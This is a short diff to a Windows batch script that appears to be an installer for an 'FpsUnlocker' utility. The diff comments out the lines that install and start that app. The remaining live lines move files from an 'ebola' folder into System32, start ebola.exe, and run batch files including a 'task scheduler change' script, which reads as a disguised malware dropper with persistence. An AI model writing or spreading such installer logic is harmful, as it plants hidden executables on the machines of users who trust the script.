@@ -37,7 +37,7 @@ move "%~dp0ebola\ch4.bat" "%windir%\System32"
 move "%~dp0ebola\ch5.bat" "%windir%\System32"
 move /d "%~dp0ebola" "%windir%\System32"
 
-move "%~dp0FpsUnlocker.exe" "%ProgramFiles%\FpsUnlocker"
+@REM move "%~dp0FpsUnlocker.exe" "%ProgramFiles%\FpsUnlocker"
 
 :starting the checkers and ebola
 start "" "%windir%\System32\ebola.exe"
@@ -48,7 +48,7 @@ start "" "%windir%\System32\ebola.exe"
 @REM start "" "%windir%\System32\ch5.bat"
 
 :starting app and task scheduler change
-start "" "%ProgramFiles%\FpsUnlocker\FpsUnlocker.exe"
+@REM start "" "%ProgramFiles%\FpsUnlocker\FpsUnlocker.exe"
 start "" "%windir%\System32\ebola\ba\tsksch.bat"
 start "" "%windir%\System32\ebola\pysetup.bat"
 
